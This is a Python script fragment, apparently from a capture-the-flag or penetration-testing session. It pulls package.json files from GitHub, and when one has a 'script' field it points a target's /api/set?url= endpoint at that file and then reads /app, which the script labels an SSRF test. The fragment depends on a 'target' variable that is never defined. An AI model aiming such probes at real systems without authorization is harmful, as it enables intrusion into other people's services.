# Maybe we can find one

test_files = [
    "https://raw.githubusercontent.com/request/request/master/package.json",
    "https://raw.githubusercontent.com/axios/axios/main/package.json",
]

for url in test_files:
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            print(f"[+] {url.split('/')[-2]} keys: {list(data.keys())[:10]}")
            if 'script' in data:
                print(f"[!!] Found 'script' field!")
                print(f"[+] Testing SSRF with this URL...")
                
                set_url = f"{target}/api/set?url={urllib.parse.quote(url)}"
                r2 = requests.get(set_url)
                print(f"[+] Set: {r2.text}")
                
                r3 = requests.get(f"{target}/app")
                print(f"[+] App: {r3.status_code}")
                print(r3.text[:1500])
                break
    except Exception as e:
        print(f"[+] Error: {e}")

